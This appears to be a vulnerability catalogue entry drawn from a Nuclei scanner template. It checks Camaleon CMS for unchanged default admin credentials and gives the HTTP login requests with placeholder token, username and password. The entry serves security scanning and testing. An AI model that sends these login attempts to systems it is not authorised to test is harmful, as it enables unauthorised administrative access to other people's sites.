# Vulnerability: Camaleon CMS - Default Login
**Classification:** CAMALEON
**Source:** Nuclei Template (`camaleon-default-login.yaml`)

## Description
Camaleon CMS default login credentials was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /admin/login HTTP/1.1
Host: {{Hostname}}

POST /admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

authenticity_token={{nonce}}&user%5Busername%5D={{username}}&user%5Bpassword%5D={{password}}
```

